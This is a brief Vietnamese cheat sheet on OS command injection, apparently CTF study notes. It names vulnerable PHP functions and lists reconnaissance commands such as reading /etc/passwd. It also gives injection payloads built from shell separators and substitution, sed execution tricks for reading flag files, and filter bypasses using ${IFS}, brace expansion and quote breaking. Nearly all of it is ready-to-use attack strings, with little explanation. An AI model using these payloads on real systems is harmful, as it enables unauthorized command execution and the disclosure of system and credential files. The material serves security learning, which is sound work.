# Nhận biết 

- exec()
- system()
- passthru()
- saas
- eval()
- ping


## Input
```
whoami                      => thông tin user hiện tại
id                          => hiện user và group id
ifconfig/ip addr            => thông tin giao diện mạng
uname -a                    => thông tin hệ thống 
ps -ef                      => trạng thái hiện tại 
cat /etc/passwd             => thông tin all user
lsb_release -a              => version ubuntu
ls -la 
```

## Exploit
- ;
- |
- &
- `
- $

```cmd
;ls
`|ls
" & ls
$(`cat /etc/passwd`)|$(`ls`)
exec('ls');
eval('ls');
<?phpinfo();?>
echo * 
| *
" * 
' *
. file.txt 
-n '1p' fl*.txt              #in ra dòng đầu tiên trong file fl*.txt
"s/.*/((cat flag.txt))/e"
```

## Bypass

### space 
```cmd
{cat,flag.txt}
echo${IFS}flag.txt
IFS=];b=cat]flag.txt;$b
```

### strpos & substr
```cmd
eval("echo hello";`ls`");
',system('head /*'),'

```

### all keyword
```cmd
\bash

>>>ls

` < /flag.txt `
```


